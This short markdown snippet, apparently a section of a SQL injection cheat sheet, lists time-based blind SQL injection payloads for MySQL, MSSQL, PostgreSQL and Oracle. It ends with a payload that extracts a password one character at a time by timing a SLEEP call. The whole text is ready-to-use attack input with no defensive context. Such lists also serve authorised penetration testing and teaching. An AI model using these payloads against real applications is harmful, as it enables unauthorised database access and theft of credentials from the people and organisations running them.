## ⏱️ Time-Based Blind SQLi

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- Oracle
'; SELECT dbms_pipe.receive_message(('a'),5) FROM dual--

-- Extract with time
' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--
```

